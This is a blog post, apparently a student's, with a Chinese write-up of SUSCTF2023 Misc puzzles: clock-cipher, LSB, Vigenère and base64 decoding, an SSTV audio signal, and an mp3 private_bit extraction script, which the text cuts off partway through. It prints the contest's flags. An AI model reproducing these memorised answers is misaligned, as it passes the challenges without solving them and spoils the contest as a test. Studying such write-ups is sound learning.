<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>SUSCTF2023-东南大学校赛WriteUp - 好好学习</title><meta name="author" content="alextang">
<meta name="author-link" content="">
<meta name="description" content="Misc 0x01 旺旺的课程表 首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。 根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间" /><meta name="keywords" content='CTF, SUSCTF, WriteUp' />
  <meta itemprop="name" content="SUSCTF2023-东南大学校赛WriteUp">
  <meta itemprop="description" content="Misc 0x01 旺旺的课程表 首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。 根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间">
  <meta itemprop="datePublished" content="2023-10-16T12:00:00+08:00">
  <meta itemprop="dateModified" content="2023-10-16T12:00:00+08:00">
  <meta itemprop="wordCount" content="8766">
  <meta itemprop="keywords" content="CTF,SUSCTF,WriteUp"><meta property="og:url" content="https://alextang.top/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/">
  <meta property="og:site_name" content="好好学习">
  <meta property="og:title" content="SUSCTF2023-东南大学校赛WriteUp">
  <meta property="og:description" content="Misc 0x01 旺旺的课程表 首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。 根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-10-16T12:00:00+08:00">
    <meta property="article:modified_time" content="2023-10-16T12:00:00+08:00">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="SUSCTF">
    <meta property="article:tag" content="WriteUp">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SUSCTF2023-东南大学校赛WriteUp">
  <meta name="twitter:description" content="Misc 0x01 旺旺的课程表 首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。 根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间">
      <meta name="twitter:site" content="@a1extang">
<meta name="application-name" content="a1extang">
<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/" /><link rel="prev" href="https://alextang.top/articles/2023/10/newstarctf2023-week2-pwn/" /><link rel="next" href="https://alextang.top/articles/2023/10/%E6%A0%A1%E8%B5%9Bpwn%E5%A4%8D%E7%9B%98/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "SUSCTF2023-东南大学校赛WriteUp",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/alextang.top\/articles\/2023\/10\/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup\/"
    },"genre": "posts","keywords": "CTF, SUSCTF, WriteUp","wordcount":  8766 ,
    "url": "https:\/\/alextang.top\/articles\/2023\/10\/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup\/","datePublished": "2023-10-16T12:00:00+08:00","dateModified": "2023-10-16T12:00:00+08:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "alextang"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                title="关于"
                
              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  title="关于"
                  
                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SUSCTF2023-东南大学校赛WriteUp</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
          <span class="post-category">收录于 <a href="/categories/writeup/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> WriteUp</a></span></div>
      <div class="post-meta-line"><span title="发布于 2023-10-16 12:00:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-16">2023-10-16</time></span>&nbsp;<span title="更新于 2023-10-16 12:00:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-16">2023-10-16</time></span>&nbsp;<span title="8766 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 8800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 18 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#0x01-旺旺的课程表">0x01 旺旺的课程表</a></li>
    <li><a href="#0x02-sustv">0x02 SUSTV</a></li>
    <li><a href="#0x03--do_u_know_jeremiah_denton">0x03  Do_u_know_Jeremiah_Denton?</a></li>
    <li><a href="#0x04-百团改">0x04 百团（改）</a></li>
    <li><a href="#0x05-can_u_find_meeeeee">0x05 Can_u_find_meeeeee?</a></li>
    <li><a href="#0x06-ai-kerasmodelsummary">0x06 AI-keras.Model.summary()</a></li>
    <li><a href="#0x07-算术">0x07 算术！</a></li>
  </ul>

  <ul>
    <li><a href="#0x01-signin">0x01 Signin</a></li>
    <li><a href="#0x02-vigenere">0x02 Vigenere</a></li>
    <li><a href="#0x03-ezmath">0x03 ezMath</a></li>
  </ul>

  <ul>
    <li><a href="#0x01-orw">0x01 orw</a></li>
    <li><a href="#0x02-random">0x02 random</a></li>
    <li><a href="#0x03-bof">0x03 bof</a></li>
    <li><a href="#0x04-ezrop">0x04 ezROP</a></li>
  </ul>

  <ul>
    <li><a href="#0x01-signin-1">0x01 signin</a></li>
    <li><a href="#0x02-babypowershell">0x02 babyPowerShell</a></li>
    <li><a href="#0x03-powershell">0x03 PowerShell</a></li>
  </ul>

  <ul>
    <li><a href="#0x01-pollute-me">0x01 pollute me</a></li>
    <li><a href="#0x02-php-is-all-you-need">0x02 PHP Is All You Need</a></li>
    <li><a href="#0x03-lavish-pastebin">0x03 Lavish Pastebin</a></li>
    <li><a href="#0x04-why-not-play-a-game">0x04 why not play a game</a></li>
    <li><a href="#0x05-easy_rce">0x05 easy_rce</a></li>
    <li><a href="#0x06-sleep-away">0x06 sleep away</a></li>
    <li><a href="#0x07-转瞬即逝">0x07 转瞬即逝</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h1 id="misc">Misc</h1>
<h2 id="0x01-旺旺的课程表">0x01 旺旺的课程表</h2>
<p>首先根据提示《死亡之链》和图片中的时间信息猜测是夏多密码。</p>
<p>根据表中的数字判断总共16个钟表，然后根据每个数字所在的位置的时间画上时针，如下图所示：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172714979.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015172734532.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>按照夏多密码的解密方法旋转和对表，结果是CYBERSECRURITY。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn" class="suffix-invalid" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>但是直接交上去flag并不对，这时候想到图片隐写。</p>
<p>先用Binwalk跑一遍发现没有结果。（zlib很可能是png自己的数据）</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173113612.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这时想到LSB隐写。于是使用StegSolve打开，左右调节信道，发现二维码：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173314881.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173314881.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173314881.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173314881.png?size=large 2x" sizes="auto" data-title="image-20231015173314881" data-alt="image-20231015173314881" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>扫描得到结果是：</p>
<p><code>vigenere:T29tAGSCf2KaZAXeBkylQrsiw3MhR3PocagnRqWrEhX5JYS4PHVlRFGnHb04LFZlPKTlANV3HcSbKHVyEB0uCXpaboShCJTycQEtBETffB4</code></p>
<p>根据提示，使用维吉尼亚密码解密，密钥就是cybersecurity。</p>
<p>解得：<code>R29vZCBKb2IgISEgZmxhZzogc3VzY3RmezcwZmUxNzE5LWU4ODEtNDMwZi04NDBkLTBhYTE3ZjUzMGRhMX0sIGhhdmUgYSBuaWNlIGRheX4</code></p>
<p>疑似Base编码，于是用base64解得flag：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015173618903.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x02-sustv">0x02 SUSTV</h2>
<p>发现歌曲的最后一段时间有&quot;嘀嘀嘀&quot;的声响。</p>
<p>根据提示（SUSTV），使用MMSSTV，将音频使用虚拟声卡读入：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015174303853.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015174303853.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015174303853.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015174303853.png?size=large 2x" sizes="auto" data-title="image-20231015174303853" data-alt="image-20231015174303853" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>得到二维码，扫描得到flag：</p>
<p>Are you a HAM? susctf{b7c55a86-56f4-4ebe-ba57-03d3cae609ea}</p>
<h2 id="0x03--do_u_know_jeremiah_denton">0x03  Do_u_know_Jeremiah_Denton?</h2>
<p>尝试Mp3Stego、摩斯码、频谱、LSB（只支持wav）无解后，找到一种private_bit隐写方法（还是根据题目中醒目的private）。</p>
<p>原理是，mp3文件格式中有很多mf数组，每个数组中都有一个字段是private_bit，使private_bit为0或1可以使mp3携带额外信息。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175026095.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175026095.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175026095.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175026095.png?size=large 2x" sizes="auto" data-title="image-20231015175026095" data-alt="image-20231015175026095" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>观察mp3文件，发现mf数组从CCh处开始，但是发现mf[0]的长度异常，于是选择从mf[1]开始，也就是0x19c。</p>
<p>发现每个mf的大小并不相同（1a1h和1a2h），发现其中的padding_bit字段是否为1决定了mf的大小：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175303102.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175303102.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175303102.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015175303102.png?size=large 2x" sizes="auto" data-title="image-20231015175303102" data-alt="image-20231015175303102" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>此时计算出padding_bit和private_bit的位置即可。padding前的比特数是12+1+2+1+4+2=22，也就是padding在第23位，private_bit在第24位。那么扔掉每个mf元素的前两个字节，取第三个字节的倒数第一、第二位分别是private_bit和padding_bit。</p>
<p>由于有padding的值，我们不需要计算没个mf元素的地址，只需要从第一个开始加上每个元素的大小即可偏移到后一个mf元素上去。</p>
<p>exp:</p>
<div class="highlight" id="id-1"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mh">0x19c</span> <span class="o">+</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">number</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;QueenCard.mp3&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mh">0x2711a0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{:08b}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">head</span><span class="p">))[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">{:08b}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">head</span><span class="p">))[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">padding</span> <span class="o">==</span> <span class="s2">&#34;0&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">+=</span> <span class="mh">0x1a1</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">+=</span> <span class="mh">0x1a2</span>
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#print(result)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
